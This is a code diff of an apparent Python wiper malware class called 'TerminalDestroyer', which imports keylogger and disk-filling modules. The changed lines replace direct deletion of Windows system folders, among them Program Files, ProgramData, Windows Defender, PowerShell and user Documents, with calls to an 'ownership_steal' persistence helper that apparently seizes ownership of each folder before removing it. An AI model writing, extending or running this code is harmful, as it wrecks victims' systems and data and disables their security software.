@@ -1,8 +1,13 @@
 from abc import ABC
 import importlib
 import shutil
-from collection import keylogger
-from collection import disk_fill as CT
+try:
+    from . import keylogger
+    from . import disk_fill as CT
+    from persistence import ownership_steal
+except ImportError:
+    import keylogger
+    import disk_fill as CT
 
 _std_platform = importlib.import_module("platform")
 OS = _std_platform.system()
@@ -37,14 +42,14 @@ class TerminalDestroyer(ABC):
 
                         except Exception:
                                 try:
-                                        shutil.rmtree("C:\\Users\\Public\\Documents")
-                                        shutil.rmtree("C:\\appdata")
-                                        shutil.rmtree("C:\\Program Files (x86)\\Windows Defender")
-                                        shutil.rmtree("C:\\Program Files (x86)\\WindowsPowershell")
-                                        shutil.rmtree("C:\\Program Files\\Windows Security\\BrowserCore")
-                                        shutil.rmtree("C:\\ProgramData")
-                                        shutil.rmtree("C:\\Program Files (x86)")
-                                        shutil.rmtree("C:\\Program Files")
+                                        ownership_steal.rem_root_dir("C:\\Users\\~\\Documents")
+                                        ownership_steal.rem_root_dir("C:\\appdata")
+                                        ownership_steal.rem_root_dir("C:\\Program Files (x86)\\Windows Defender")
+                                        ownership_steal.rem_root_dir("C:\\Program Files (x86)\\WindowsPowershell")
+                                        ownership_steal.rem_root_dir("C:\\Program Files\\Windows Security\\BrowserCore")
+                                        ownership_steal.rem_root_dir("C:\\ProgramData")
+                                        ownership_steal.rem_root_dir("C:\\Program Files (x86)")
+                                        ownership_steal.rem_root_dir("C:\\Program Files")
                                         pass
 
                                 except Exception as e:
